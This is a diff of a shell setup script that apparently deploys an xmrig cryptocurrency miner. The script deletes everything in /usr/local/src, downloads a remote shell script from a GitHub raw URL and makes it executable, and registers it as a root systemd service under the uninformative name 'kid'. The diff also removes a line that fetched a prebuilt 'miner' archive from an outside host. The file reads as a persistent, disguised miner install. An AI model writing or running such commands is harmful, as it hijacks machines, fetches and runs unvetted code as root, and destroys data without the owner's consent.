@@ -7,7 +7,6 @@ sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-de
 cd /usr/local/src/ && rm -rf * &&
 wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-14-link1.sh && chmod a+x suxmr-14-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
-cd /usr/local/src/xmrig/build && wget https://release.monitorom.com/data/cpu/cpu_fe.tar.xz && tar xf cpu_fe.tar.xz && sudo chmod a+x miner
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
 [Unit]
 Description=kid
@@ -15,8 +14,7 @@ After=network.target
 [Service]
 Type=forking
 ExecStart=/usr/local/src/suxmr-14-link1.sh
-WatchdogSec=3600
-Restart=always
+Restart=on-failure
 RestartSec=60
 User=root
 [Install]
